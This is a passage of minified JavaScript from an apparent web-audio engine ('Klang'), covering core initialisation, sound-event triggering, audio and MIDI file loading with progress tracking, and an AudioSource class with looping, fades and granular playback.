core");t.context.currentTime;if(-1!=i.settings.blur_fade_time){this._blurFadeOut=!0;var c=i.settings.blur_fade_time||.5;0>c&&-1!=c&&t.warn("Core: Invalid blur_fade_time value. Must be -1 or >= 0.");var h=this,l=this.getHiddenProp();if(l){var p="visibilitychange";document.addEventListener(p,o)}}B.FileHandler.instance.fileInfo=(void 0!=n?n:i.files)||[],this._eventTable=i.events||{},this._objectTable={};for(var _ in i.audio)this._objectTable[_]=i.audio[_];for(var _ in i.busses)this._objectTable[_]=i.busses[_];for(var _ in i.sequencers)this._objectTable[_]=i.sequencers[_];for(var _ in i.processes)this._objectTable[_]=i.processes[_];for(var _ in i.synths)this._objectTable[_]=i.synths[_];for(var _ in i.lfos)this._objectTable[_]=i.lfos[_];for(var _ in i.automations)this._objectTable[_]=i.automations[_];this.setVars(i.vars),this._masterBusId=i.masterBus,this._exportedSymbols=i.exportedSymbols||{},this._logIgnore=i.debug.log_ignore||i.log_ignore||{},B.Panner.setListenerData(i.settings.listener),U.createCurves(i.curves),this._loadStartTimestamp=(new Date).getTime(),i.debug&&(t.debugData.ignoredEvents=i.debug.ignored_events||t.debugData.ignoredEvents,t.debugData.logToConsole=i.debug.log_to_console||t.debugData.logToConsole),t.log("Pre load initialization started");for(var f=0,d=this._preLoadInitStack.length;d>f;f++){var g=this._preLoadInitStack[f];g.init&&g.init()}t.log("Pre load initialization finished"),t.log("Connecting nodes"),this._superMasterOutput.connect(t.context.destination);for(var f=0,d=this._connectStack.length;d>f;f++){var g=this._connectStack[f];switch(g.destinationName){case"$OUT":g.connect(this._superMasterOutput);break;case"$PARENT":break;default:var y=this.findInstance(g.destinationName);y||t.warn("Core: Destination not found: "+g.destinationName),"Bus"!=y._type&&t.warn("Core: Destination is not a bus: "+g.destinationName),g.connect(y.input)}}t.log("Nodes connected"),this._preLoadInitStack=null,this._connectStack=null,this._timeHandler=new B.TimeHandler,this._initComplete=!0,t.log("Core initialized"),B.FileHandler.instance.baseURL=r,(!t.initOptions||t.initOptions&&!t.initOptions.noAutoLoad)&&B.FileHandler.instance.loadFiles("auto",e.soundsLoaded,this._progressCallback)},e.prototype.isHidden=function(){var t=this.getHiddenProp();return t?document[t]:!1},e.prototype.getHiddenProp=function(){var t=["webkit","moz","ms","o"];if("hidden"in document)return"hidden";for(var e=0;e<t.length;e++)if(t[e]+"Hidden"in document)return t[e]+"Hidden";return null},e.prototype.setVars=function(t){if(t){for(var e in t)if("string"==typeof t[e]&&t[e].indexOf("me.")>-1)t[e]=this.findInstance(t[e].split("me.")[1]);else if("object"==typeof t[e]){var i=t[e];for(var n in i)i.hasOwnProperty(n)&&"string"==typeof i[n]&&i[n].indexOf("me.")>-1&&(i[n]=this.findInstance(i[n].split("me.")[1]))}U.vars=t}},e.prototype.loadSoundFiles=function(t,e,i,n){i&&(this._progressCallback=i);var s=this;B.FileHandler.instance.loadFiles(t,function(t,i){for(var n=0;n<i.length;n++){var o=i[n].id;for(var r in s._objectTable)if(s._objectTable.hasOwnProperty(r)){var a=s._objectTable[r];"AudioSource"===a._type&&a._fileId===o&&a.init()}}e&&e(!0)},this._progressCallback,n)},e.prototype.freeSoundFiles=function(t){B.FileHandler.instance.freeSoundFiles(t);for(var e in this._objectTable){var i=this._objectTable[e];if("AudioSource"==i._type){var n=B.FileHandler.instance.getFileInfo(i._fileId);n&&n.load_group==t&&i.freeBuffer()}}},e.soundsLoaded=function(){t.log("Post load initialization started");for(var i=e.instance,n=0,s=i._postLoadInitStack.length;s>n;n++)i._postLoadInitStack[n].init();t.log("Post load initialization finished"),i._postLoadInitStack=null,i._readyCallback&&i._readyCallback(!0)},e.prototype.pushToPreLoadInitStack=function(t){return this._preLoadInitStack?(this._preLoadInitStack.push(t),!0):!1},e.prototype.pushToPostLoadInitStack=function(t){return this._postLoadInitStack?(this._postLoadInitStack.push(t),!0):!1},e.prototype.pushToConnectStack=function(t){return this._connectStack?(this._connectStack.push(t),!0):!1},e.prototype.findInstance=function(e){var i=this._objectTable[e];return i||t.warn("Core: Unknown reference: '"+e+"'"),
i},e.prototype.triggerEvent=function(e){for(var i=[],n=0;n<arguments.length-1;n++)i[n]=arguments[n+1];if(U.lastEvent=e,!t.debugData.ignoredEvents[e]){this._eventTable[e]?t.debugData.logToConsole&&!this._logIgnore[e]&&t.logc("Klang Core: Incoming sound event: '"+e+"', "+i,U.LOG_EVENT_COLOR):t.debugData.logToConsole&&!this._logIgnore[e]&&t.logc("Klang Core: Incoming sound event: '"+e+"', "+i,U.LOG_UNIMPLEMENTED_EVENT_COLOR);var s=this._eventTable[e];if("string"==typeof s)this._objectTable[s]||t.warn("Core: Unknown process: '"+s+"'"),"SimpleProcess"!=this._objectTable[s]._type&&"AdvancedProcess"!=this._objectTable[s]._type&&t.warn("Core: Object is not a process: '"+s+"'"),this._objectTable[s].start(i[0]);else if(s instanceof Array)for(var o=0,r=s.length;r>o;o++)this._objectTable[s[o]]||t.warn("Core: Unknown process: '"+s[o]+"'"),"SimpleProcess"!=this._objectTable[s[o]]._type&&"AdvancedProcess"!=this._objectTable[s[o]]._type&&t.warn("Core: Object is not a process: '"+s+"'"),this._objectTable[s[o]].start(i[0])}},e.prototype.getSymbolId=function(t){return this._exportedSymbols[t]},e.prototype.initIOS=function(){var e=t.context.createBufferSource();e.start(0)},Object.defineProperty(e.prototype,"timeHandler",{get:function(){return this._timeHandler},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"output",{get:function(){return this._superMasterOutput},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"blurFadeOut",{get:function(){return this._blurFadeOut},set:function(t){this._blurFadeOut=t},enumerable:!0,configurable:!0}),e}();t.READY_STATE_NOT_INITIATED=0,t.READY_STATE_INITIATED=1,t.READY_STATE_LOADED=2,t.klangInited=!1,t.readyState=t.READY_STATE_NOT_INITIATED;var G;t.pushToEventQue=e,t.triggerEvent=i,t.getDestinationForEvent=n,t.init=r,t.initIOS=a,t.getLoadGroups=u,t.getCoreInstance=c,t.getFileHandlerInstance=h,t.getUtil=l,t.getModel=p,t.schedule=_,t.createObject=f,t.setDebugFlag=d,t.load=g,t.free=y,t.getLoadProgress=m,t.stopAll=v,t.$=b,t.log=T,t.logc=S,t.warn=O,t.err=P,t.zeropad=A,t.getTimeStamp=w,t.getTimeString=E,t.getEvents=x,t.debugData={ignoredEvents:{},logToConsole:!0},t.visualWindow,t.setCallbacks=k,t.schedulePredefinedEvents=F,t.deinit=C;var B;!function(e){function i(t,e,i,n,s){"undefined"==typeof s&&(s="equalpower");var o,r;if("linear"==s)o=function(t){return 1-t},r=function(t){return t};else{if("equalpower"!=s)return;o=function(t){return Math.pow(1-t,.5)},r=function(t){return Math.pow(t,.5)}}i=Math.min(i,t.length),n=Math.min(n,e);for(var a=0;a<t.numberOfChannels;a++){for(var u=t.getChannelData(a),c=i-1,h=e-1,l=n-1;l>=0;l--){var p=(l+1)/(n+1);u[c]=u[c]*o(p)+u[h]*r(p),c--,h--}for(var _=i,f=e;_<t.length;)u[_++]=u[f++]}}function n(t){switch(t){case g.PrePlaying:return"PrePlaying";case g.Playing:return"Playing";case g.PreStopping:return"PreStopping";case g.PostStop:return"PostStop";case g.Stopped:return"Stopped"}}function o(e,i){(0>i||i>3)&&t.warn("Synth: Invalid noise algorithm: "+i);var n=e||65536,s=t.context.createBuffer(1,n,t.context.sampleRate),o=s.getChannelData(0);i||(i=0);for(var r=0;n>r;r++)switch(i){case 0:o[r]=2*Math.random()-1;break;case 1:o[r]=Math.random();break;case 2:o[r]=Math.random()-1;break;case 3:o[r]=r/n}return s}var r=function(){function t(){}return t.prototype.on=function(t,e,i){this._events=this._events||{};var n=this._events[t]||(this._events[t]=[]);return n.push({callback:e,ctxArg:i,context:i||this}),this},t.prototype.off=function(t,e,i){var n,s,o,r;if(!this._events||!this._events[t])return this;t||e||i||(this._events={});var a=this._events[t];if(a){if(r=[],e&&i)for(n=0,s=a.length;s>n;n++)o=a[n],e!==o.callback&&i!==o.ctxArg&&r.push(a[n]);else if(e)for(n=0,s=a.length;s>n;n++)o=a[n],e!==o.callback&&r.push(a[n]);else if(i)for(n=0,s=a.length;s>n;n++)o=a[n],i!==o.ctxArg&&r.push(a[n]);this._events[t]=r}return this._events[t].length||delete this._events[t],this},t.prototype.trigger=function(t){for(var e=[],i=0;i<arguments.length-1;i++)e[i]=arguments[i+1];if(!this._events||!this._events[t])return this;var n,s,o;for(o=this._events[t],e=[].splice.call(arguments,1),n=o.length-1;n>=0;n--)s=o[n],s.callback.apply(s.context,e);return this},t}();e.EventEmitter=r;var a=function(){function e(){this.memUsage=0,this._decoding=!1,this._files={},this._bufferQue=[],this._groups={},this._lastSentPercent=-1}return e.inst=null,Object.defineProperty(e,"instance",{get:function(){return null==e.inst&&(e.inst=new e),e.inst},enumerable:!0,configurable:!0}),e.prototype.sendProgressCallback=function(t){var e=this._groups[t];if(e.progressCallback&&!e.loadInterrupted){var i=0;e.progress.readyAudioFiles>=e.progress.totalAudioFiles&&(i=Math.floor((e.progress.loadedBytes+e.progress.bufferedFiles)/(e.progress.totalBytes+e.progress.totalFiles)*(100-(e.progress.totalFiles-e.progress.convertedFiles)))),this._lastSentPercent!==i&&e.progressCallback(i),this._lastSentPercent=i}},e.prototype.updateProgress=function(t,e){var i=t.load_group;if(!t.sizeReceived){t.sizeReceived=!0;var n=1;e.lengthComputable&&(n=e.total,t.loadedBytes=0),t.totalBytes=n,this._groups[i].progress.totalBytes+=n,this._groups[i].progress.readyAudioFiles++}if(void 0!=t.loadedBytes){var s=e.loaded-t.loadedBytes;t.loadedBytes=e.loaded,this._groups[i].progress.loadedBytes+=s,this.sendProgressCallback(i)}},e.prototype.decodeBufferQue=function(){var e=this;if(this._bufferQue.length&&!this._decoding){var i=this._bufferQue.pop(),n=i.data,s=i.info,o=i.callback;this._decoding=!0,t.context.decodeAudioData(n,function(n){var r=e._groups[s.load_group];if(e._decoding=!1,t.useMonoBuffers){for(var a=n.length,u=t.context.createBuffer(1,a,t.context.sampleRate),c=n.getChannelData(0),h=u.getChannelData(0),l=0;a>l;l++)h[l]=c[l];n=u}e.memUsage+=n.length*n.numberOfChannels*Float32Array.BYTES_PER_ELEMENT;e.memUsage;e.addFile(s,n),r.progress.convertedFiles++,i.data=null,e._bufferQue.length?e.decodeBufferQue():o&&o()},function(e){t.log("Klang warning: unable to load file '"+(this._baseURL||"")+s.url+"'")})}},e.prototype.loadAudioBuffer=function(e,i){var n=this,s=new XMLHttpRequest,o=".mp3";("Firefox"===t.detector.browser.name||"Chrome"===t.detector.browser.name)&&(o=".ogg");var r=(e.external?"":this._baseURL)+e.url+o;s.open("GET",r,!0),s.responseType="arraybuffer",s.sizeReceived=!1,s.load_group=e.load_group,s.onprogress=function(t){n.updateProgress(s,t)},s.onload=function(t){var o=n._groups[e.load_group];if(n._bufferQue.push({data:s.response,load_group:o,info:e,callback:i}),s.loadedBytes){var r=s.totalBytes-s.loadedBytes;o.progress.loadedBytes+=r}else o.progress.loadedBytes+=1;n.updateProgress(s,t),n.decodeBufferQue(),s.response=null,s=null},s.onreadystatechange=function(){4==s.readyState&&200==s.status||200!=s.status&&(n._groups[e.load_group].loadInterrupted=!0,n._groups[e.load_group].loadFailedCallback&&n._groups[e.load_group].loadFailedCallback())},s.send(),this._groups[e.load_group].progress.totalAudioFiles++},e.prototype.loadMidiFile=function(t,e){var i=this;loadRemote(this._baseURL+t.url,function(t,e){i.updateProgress(t,e)},function(n){i.addFile(t,readMidiFile(n)),e&&e()})},e.prototype.loadMidiString=function(t){var e=this,i=new XMLHttpRequest;i.open("GET",this._baseURL+t.url),i.onprogress=function(t){e.updateProgress(i,t)},i.onreadystatechange=function(){4==this.readyState&&200==this.status&&e.addFile(t,readMidiString(i.response))},i.send()},e.prototype.loadFiles=function(t,e,i,n){"string"==typeof t&&(t=[t]);for(var s=0,o=t.length;o>s;s++)this._groups[t[s]]={},this._groups[t[s]]._loadedFiles=[],this._groups[t[s]].filesLoadedCallback=e,this._groups[t[s]].progressCallback=i,this._groups[t[s]].loadFailedCallback=n,this._groups[t[s]].loadInterrupted=!1,this._groups[t[s]].progress={totalBytes:0,loadedBytes:0,totalFiles:0,totalAudioFiles:0,readyAudioFiles:0,bufferedFiles:0,convertedFiles:0};for(var s=0,o=this._fileInfo.length;o>s;s++){var r=this._fileInfo[s],a=t.indexOf(r.load_group);if(-1!=a&&!this._files[r.id]&&!r.only_audio_tag){switch(r.file_type){case"audio":this.loadAudioBuffer(r);break;case"midi":this.loadMidiFile(r);break;case"midistring":this.loadMidiString(r)}this._groups[t[a]].progress.totalFiles++}}for(var s=0,o=t.length;o>s;s++)0==this._groups[t[s]].progress.totalFiles&&this._groups[t[s]].filesLoadedCallback&&!this._groups[t[s]]._loadInterrupted&&this._groups[t[s]].filesLoadedCallback(!0,this._groups[t[s]]._loadedFiles)},e.prototype.prepareFile=function(t){this._fileInfo.push(t)},e.prototype.prepareFiles=function(t){var e,i;for(e=0,i=t.length;i>e;e++)this.prepareFile(t[e])},e.prototype.addFile=function(t,e){this._files[t.id]=e,this._groups[t.load_group].progress.bufferedFiles++,this._groups[t.load_group]._loadedFiles=this._groups[t.load_group]._loadedFiles||[],this._groups[t.load_group]._loadedFiles.push(t),this.sendProgressCallback(t.load_group),this._groups[t.load_group].progress.bufferedFiles!=this._groups[t.load_group].progress.totalFiles||this._groups[t.load_group].loadInterrupted||this._groups[t.load_group].filesLoadedCallback&&this._groups[t.load_group].filesLoadedCallback(!0,this._groups[t.load_group]._loadedFiles||[])},e.prototype.freeSoundFiles=function(t){"string"==typeof t&&(t=[t]);for(var e=0,i=this._fileInfo.length;i>e;e++){var n=this._fileInfo[e];-1!=t.indexOf(n.load_group)&&(this._files[n.id]=null)}},e.prototype.getLoadGroups=function(){var t,e=this._fileInfo||[],i={},n=[];for(t=0;t<e.length;t++){var s=e[t];i[s.load_group]=s.load_group}for(t in i)n.push(t);return n},e.prototype.getFile=function(t){return this._files[t]||null},e.prototype.getFilesForLoadgroup=function(t){for(var e=[],i=0,n=this._fileInfo.length;n>i;i++)this._fileInfo[i].load_group==t&&e.push(this._fileInfo[i]);return e},e.prototype.getFileInfo=function(t){for(var e=0,i=this._fileInfo.length;i>e;e++)if(this._fileInfo[e].id==t)return this._fileInfo[e];return void 0},Object.defineProperty(e.prototype,"progress",{get:function(){return this._groups},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"baseURL",{set:function(t){this._baseURL=t},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"fileInfo",{set:function(t){this._fileInfo=t},enumerable:!0,configurable:!0}),e}();e.FileHandler=a;var u=function(){function e(e,i){this._name=i,this._type=e.type,this._output=t.context.createGain(),this._volume=void 0!=e.volume?e.volume:1,this._output.gain.value=this._volume,e.destination_name&&(this.destinationName=e.destination_name,R.instance.initComplete||R.instance.pushToConnectStack(this))}return e.prototype.connect=function(e){return t.warn("Audio: Invocation of abstract method: Audio.connect in",this),this},e.prototype.disconnect=function(){return t.warn("Audio: Invocation of abstract method: Audio.disconnect in",this),this},e.prototype.play=function(e,i){return t.warn("Audio: Invocation of abstract method: Audio.play in",this),this},e.prototype.stop=function(e){return t.warn("Audio: Invocation of abstract method: Audio.stop in",this),this},e.prototype.pause=function(){return t.warn("Audio: Invocation of abstract method: Audio.pause in",this),this},e.prototype.unpause=function(){return t.warn("Audio: Invocation of abstract method: Audio.unpause in",this),this},e.prototype.curvePlaybackRate=function(e,i){return t.warn("Audio: Invocation of abstract method: Audio.curvePlaybackRate in",this),this},e.prototype.fadeInAndPlay=function(t,e){return console.warn("Audio: Invocation of abstract method: Audio.fadeInAndPlay in",this),this},e.prototype.fadeOutAndStop=function(t,e){return console.warn("Audio: Invocation of abstract method: Audio.fadeOutAndStop in",this),this},e.prototype.deschedule=function(){return console.warn("Audio: Invocation of abstract method: Audio.deschedule in",this),this},Object.defineProperty(e.prototype,"playbackRate",{set:function(e){return t.warn("Audio: Invocation of abstract property: Audio.playbackRate in",this),this},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"playing",{get:function(){return t.warn("Audio: Invocation of abstract property: Audio.playing in",this),!1},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"duration",{get:function(){return t.warn("Audio: Invocation of abstract property: Audio.duration in",this),0},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"output",{get:function(){return this._output},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"playbackState",{get:function(){return t.warn("Audio: Invocation of abstract property: Audio.playbackState in",this),0},enumerable:!0,configurable:!0}),e.prototype.setData=function(t){this._volume=void 0==t.volume?1:t.volume,this._output.gain.value=this._volume,this.destinationName!=t.destination_name&&(this.destinationName=t.destination_name,this.disconnect(),this.connect(R.instance.findInstance(this.destinationName).input))},e}();e.Audio=u;var c=function(n){function o(t,e){if(n.call(this,t,e),this._sources=[],this._startTime=0,this._loopStartTime=0,this._scheduleAhead=.2,this._stopping=!1,this._fading=!1,this._paused=!1,this._pauseTime=-1,this._pauseStartTime=-1,this.data=t,this.editorName=t.editorName,this._fileId=t.file_id,this._playbackRate=t.playback_rate||1,this._endTime=0,this._loop=void 0!=t.loop?t.loop:!1,this._loopStart=t.loop_start,this._loopEnd=t.loop_end,this._offset=t.offset||0,this._duration=t.duration||0,this._reverse=t.reverse,this._retrig=void 0!=t.retrig?t.retrig:!0,this._lockPlaybackrate=void 0!=t.lock_playback_rate?t.lock_playback_rate:!1,this._volumeStartRange=t.volume_start_range,this._volumeEndRange=t.volume_end_range,this._pitchStartRange=t.pitch_start_range,this._pitchEndRange=t.pitch_end_range,t.panner&&(this._panner=t.panner),t.granular){this._granular={bufferDuration:0,speed:t.granular.speed||.3333,pitch:t.granular.pitch||0,pitchRandomization:t.granular.pitch_randomization||0,timeRandomization:t.granular.time_randomization||0,realTime:0,grainTime:0,grainDuration:t.granular.grain_duration||.09,grainSpacing:t.granular.grain_spacing||.045,grainWindow:null};var i=16384;this._granular.grainWindow=new Float32Array(i);for(var s=0;i>s;++s)this._granular.grainWindow[s]=Math.sin(Math.PI*s/i)}R.instance.pushToPostLoadInitStack(this)||this.init()}return s(o,n),o.prototype.init=function(){if(this._fileId&&("string"==typeof this._fileId?this._buffer=a.instance.getFile(this._fileId):this._fileId.sampleRate&&(this._buffer=this._fileId)),this._buffer){if(this._duration||(this._duration=this._buffer.duration),this._granular&&(this._granular.bufferDuration=this._buffer.duration-.05),this._reverse){for(var e=t.context.createBuffer(this._buffer.numberOfChannels,this._buffer.length,t.context.sampleRate),n=0;n<this._buffer.numberOfChannels;n++)for(var s=this._buffer.getChannelData(n),o=e.getChannelData(n),r=s.length,u=r-1;u>=0;u--)o[r-u]=s[u];this._buffer=e}if(this.data.xfade){for(var c=t.context.createBuffer(this._buffer.numberOfChannels,this._buffer.length,t.context.sampleRate),n=0;n<this._buffer.numberOfChannels;n++)for(var s=this._buffer.getChannelData(n),h=c.getChannelData(n),r=s.length,u=r-1;u>=0;u--)h[u]=s[u];this._buffer=c;var l=t.context.sampleRate,p=this.data.xfade===!0?11025:this.data.xfade*l,_=void 0==this._loopStart?p:Math.round(this._loopStart*l),f=void 0==this._loopEnd?this._buffer.length:Math.round(this._loopEnd*l);i(this._buffer,_,f,p)}}},o.prototype.setLoopRegion=function(t,e){this._loopStart=t||this._loopStart,this._loopEnd=e||this._loopEnd;for(var i=0,n=this._sources.length;n>i;i++){var s=this._sources[i];s.loopStart=this._loopStart,s.loopEnd=this._loopEnd}return this},o.prototype.connect=function(t,e){return(!this._destination||e)&&(this._destination=t,this._panner?(this._output.connect(this._panner.input),this._panner.output.connect(t)):this._output.connect(t)),this},o.prototype.disconnect=function(){return this._output.disconnect(),this._destination=null,this._panner&&this._panner.output.disconnect(),this},o.prototype.scheduleGrain=function(){if(this._buffer){var e=this._granular,i=t.context.createBufferSource();i.buffer=this._buffer;var n=Math.random(),s=Math.random(),o=Math.random(),r=Math.random();Math.random();n=2*(n-.5),s=2*(s-.5),o=2*(o-.5),r=2*(r-.5);var a=t.context.createGain();i.connect(a),a.connect(this._output);var u=this._granular.pitch+n*e.pitchRandomization,c=Math.pow(2,u/1200);i.playbackRate.value=c;var h=s*e.timeRandomization;i.start(e.realTime,e.grainTime+h,e.grainDuration);var l=e.grainDuration/c;a.gain.value=0,a.gain.setValueCurveAtTime(e.grainWindow,e.realTime,l);e.grainTime;e.realTime+=e.grainSpacing,e.grainTime+=e.speed*e.grainSpacing,e.grainTime>e.bufferDuration&&(e.grainTime=0,this._loop||this.stop()),e.grainTime<0&&(e.grainTime+=e.bufferDuration,this._loop||this.stop())}},o.prototype.granularSchedule=function(e){for(;this._granular.realTime<e+.1;)this.scheduleGrain();var i=this;this._granular.scheduleId=setTimeout(function(){i.granularSchedule(t.context.currentTime)},20)},o.prototype.play=function(e,i,n){if("undefined"==typeof e&&(e=0),"undefined"==typeof i&&(i=0),"undefined"==typeof n&&(n=!1),this.removeUnusedSources(),!this._buffer&&(this.init(),!this._buffer))return void t.warn("AudioSource: Buffer not found!",this._name);if(e=e||0,this._granular)this.granularSchedule(e);else{if(0!=e&&e+.01<=t.context.currentTime)return t.warn("AudioSource: Returned, playTime < currentTime",this._name),this;if(0==e&&(e=t.context.currentTime),this.output.gain.cancelScheduledValues(e),void 0!=this._volumeStartRange?this.output.gain.setValueAtTime(this._volume*(Math.random()*(this._volumeEndRange-this._volumeStartRange)+this._volumeStartRange),e):this.output.gain.setValueAtTime(this._volume,e),this.paused||(this._pauseStartTime=e),n||(this._pauseTime=0),this._startTime=e,this._loopStartTime=e+this.duration,this._paused=!1,this._stopping&&!this._retrig)return this.output.gain.cancelScheduledValues(e),this.output.gain.setValueAtTime(this.output.gain.value,e),this.output.gain.linearRampToValueAtTime(this._volume,e+.25),clearTimeout(this._stoppingId),void(this._stopping=!1);if(!this._fading,this._fading=!1,this._retrig||this.loop)if(this.loop&&!this._retrig){if(-1==this._endTime||e<this._endTime)return}else{if(this.loop&&this._retrig&&this.playing&&!this._stopping)return;if(this._stopping)this._stopping=!1;else if(Math.round(1e3*this._endTime)/1e3==Math.round(1e3*(e+this._buffer.duration))/1e3)return t.warn("AudioSource: Returned, Doubletrig",this._name),this}else if(e<this._endTime)return;this._endTime=this.loop?-1:e+this._buffer.duration;var s=this.createBufferSource();s.buffer=this._buffer,this._loop&&(s.loop=!0,s.loopStart=this._loopStart?this._loopStart:0,s.loopEnd=this._loopEnd?this._loopEnd:this._buffer.duration,"Safari"==t.detector.browser.name&&(s.loopStart-=1200/t.context.sampleRate)),this._destination||t.warn("AudioSource: no destination node"),"object"!=typeof this._destination&&t.warn("AudioSource: destination is not an object",this._name),s.connect(this._output),i>this._duration&&(i%=this._duration),this._startOffset=this._offset+i;var o=this._duration;void 0!=this._pitchStartRange&&(s.playbackRate.value=this._playbackRate*(Math.random()*(this._pitchEndRange-this._pitchStartRange)+this._pitchStartRange)),s.startTime=e,s.start(e,this._startOffset,o||s.buffer.duration),R.callbacks&&R.callbacks.scheduleAudioSource&&R.callbacks.scheduleAudioSource({audio:this,startTime:e})}return this},o.prototype.getNumberOfSamples=function(){return this._buffer.length},o.prototype.stop=function(t){if("undefined"==typeof t&&(t=0),this._granular)clearTimeout(this._granular.scheduleId);else{this._stopping&&(this._stopping=!1,clearTimeout(this._stoppingId));var e=this._sources.length;if(e>0)if(t=t||U.now(),this._loop&&(this._loopPlaying=!1),this._endTime=t,this._retrig)this._sources[this._sources.length-1].stop(t),this._sources.splice(this._sources.length-1,1);else{for(var i=0;e>i;i++){var n=this._sources[i];n.stop(t),this._endTime=U.now()}this._sources=[]}else this._loopPlaying=!1}return this},o.prototype.deschedule=function(){for(var e=0;e<this._sources.length;e++){var i=this._sources[e];i.startTime>t.context.currentTime&&(i.stop(0),this._sources[e].disconnect(),i.disconnect(),this._sources.splice(e,1),e--)}return this},o.prototype.pause=function(){if(this._endTime>U.now()){this._paused=!0;var t=U.now()-this._startTime;this._pauseTime+=t,this.stop()}return this},o.prototype.unpause=function(){if(this.paused){var t=this._offset;this._offset+=this._pauseTime,this.play(0,0,!0),this._offset=t,this._paused=!1}return this},o.prototype.createBufferSource=function(){var e=t.context.createBufferSource();return e.playbackRate.value=this._playbackRate,this._sources.push(e),e},o.prototype.fadeInAndPlay=function(e,i,n){"undefined"==typeof n&&(n=0);var s=t.context.currentTime;if(i||(i=s),(!this.loop||this._retrig||!(-1==this._endTime||i<this._endTime)||this._stopping)&&(!(this.loop&&this._retrig&&this.playing)||this._stopping)){if(this.output.gain.cancelScheduledValues(i),this._stopping&&!this._retrig)clearTimeout(this._stoppingId),this.output.gain.setValueAtTime(this.output.gain.value,i);else{if(this._stopping&&this._retrig){this._fading=!0,this.play(i==s?0:i,n);var o=t.context.createGain();return this._sources[this._sources.length-1].disconnect(),this._sources[this._sources.length-1].connect(o),o.connect(this.output),o.gain.setValueAtTime(0,i),o.gain.linearRampToValueAtTime(1,i+e),void(this._stopping=!1)}this._fading=!0,this.play(i==s?0:i,n),this.output.gain.setValueAtTime(0,i)}return this._stopping=!1,this.output.gain.linearRampToValueAtTime(this._volume,i+e),this}},o.prototype.fadeOutAndStop=function(e,i){if(this.playing){if(void 0==i&&(i=t.context.currentTime),this._stopping&&clearTimeout(this._stoppingId),this._retrig&&!this._stopping){var n=t.context.createGain();this._sources[this._sources.length-1].disconnect(),this._sources[this._sources.length-1].connect(n);var s=this;this._sources[this._sources.length-1].hasOwnProperty("onended")?this._sources[this._sources.length-1].onended=function(){s._stopping=!1}:this._stoppingId=setTimeout(function(){s._stopping=!1},1e4*(e+(i-U.now())-s._scheduleAhead)),n.connect(this.output),n.gain.setValueAtTime(1,i),n.gain.linearRampToValueAtTime(0,i+e),this.stop(i+e)}else if(!this._retrig){this.output.gain.cancelScheduledValues(i),this.output.gain.setValueAtTime(this.output.gain.value||this._volume,i),this.output.gain.linearRampToValueAtTime(0,i+e);var s=this;this._stoppingId=setTimeout(function(){s._stopping&&(s._stopping=!1,s.loop&&(s._loopPlaying=!1),s.stop(i+e))},(e+(i-U.now())-s._scheduleAhead)/.001)}return this._stopping=!0,this}},o.prototype.removeUnusedSources=function(){for(var e=0;e<this._sources.length;e++){var i=this._sources[e];(!i.buffer||!this.loop&&i.startTime+i.buffer.duration<t.context.currentTime)&&(this._sources[e].disconnect(),this._sources.splice(e,1),e--)}},o.prototype.curvePlaybackRate=function(t,e){if(!this._lockPlaybackrate){var i=this.playbackRateNode;return i&&(i.cancelScheduledValues(U.now()),i.setValueAtTime(0==i.value?U.EXP_MIN_VALUE:i.value,U.now()),i.exponentialRampToValueAtTime(t,U.now()+e)),this._playbackRate=t,this}},Object.defineProperty(o.prototype,"lastSource",{get:function(){var t=this._sources.length;return 0==t?null:this._sources[t-1]},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"loop",{get:function(){return this._loop},set:function(t){this._loop=t},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"offset",{get:function(){return this._offset},set:function(t){"string"==typeof t&&-1!==t.indexOf("%")&&(t=this._duration*parseFloat(t)),this._offset=t},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"position",{get:function(){if(!this.playing||!this._duration)return 0;var t=this._duration;(this._loopStart||this._loopEnd)&&(t=(this._loopEnd||t)-(this._loopStart||0));var e=U.now()-this._startTime,i=U.now()+this._startOffset-this._loopStartTime;return this._startOffset+e>this._duration?this._loopStart+i%t:this._startOffset+e},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"duration",{get:function(){return this._duration},set:function(t){this._duration=t},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"paused",{get:function(){return this._paused},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"playbackRate",{get:function(){return this._playbackRate},set:function(t){if(!this._lockPlaybackrate){var e=this.playbackRateNode;e&&e.cancelScheduledValues(U.now()),this._playbackRate=t;for(var i=0,n=this._sources.length;n>i;i++)this._sources[i].playbackRate.value=this._playbackRate}},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"nextPlaybackRate",{set:function(t){this._lockPlaybackrate||(this._playbackRate=t)},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"playbackRateNode",{get:function(){var t=this.lastSource;return t&&t.playbackRate},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"buffer",{get:function(){return this._buffer||(this._buffer=a.instance.getFile(this._fileId)),this._buffer},set:function(t){this._buffer=t},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"playing",{get:function(){return-1==this._endTime||this._endTime>U.now()},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"playbackState",{get:function(){var t=this.lastSource;return t?t.playbackState:0},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"output",{get:function(){return this._panner?this._panner.output:this._output},enumerable:!0,configurable:!0}),Object.defineProperty(o.prototype,"panner",{get:function(){return this._panner},enumerable:!0,configurable:!0}),o.prototype.freeBuffer=function(){this._buffer=null;for(var t=0,e=this._sources.length;e>t;t++){try{this._sources[t].stop(0)}catch(i){}this._sources[t].disconnect(),this._sources[t]=null}this._sources=[]},o.prototype.setData=function(t){n.prototype.setData.call(this,t);var i=!1;this._volumeStartRange=t.volume_start_range,this._volumeEndRange=t.volume_end_range,this._pitchEndRange=t.pitch_end_range,this._pitchStartRange=t.pitch_start_range,void 0!=t.file_id&&this._fileId!=t.file_id&&(this._fileId=t.file_id,i=!0),this._playbackRate=void 0==t.playback_rate?1:t.playback_rate,this.playbackRateNode&&(this.playbackRateNode.value=this._playbackRate),this._loop=void 